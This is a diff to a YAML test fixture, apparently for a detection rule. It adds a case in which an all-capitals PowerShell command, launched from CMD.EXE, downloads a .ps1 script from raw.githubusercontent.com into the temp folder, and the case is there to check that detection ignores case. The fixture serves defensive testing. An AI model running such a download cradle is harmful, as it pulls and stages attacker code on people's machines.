@@ -30,3 +30,10 @@ negative:
     event.code: "22"
     process.name: powershell.exe
     dns.question.name: raw.githubusercontent.com
+recased_positive:
+- name: "all-capitals download cradle"
+  event:
+    <<: *ev
+    process.name: "POWERSHELL.EXE"
+    process.command_line: "POWERSHELL.EXE -C \"INVOKE-WEBREQUEST -URI HTTPS://RAW.GITHUBUSERCONTENT.COM/X/Y/MAIN/A.PS1 -OUTFILE $ENV:TEMP\\A.PS1\""
+    process.parent.name: "CMD.EXE"
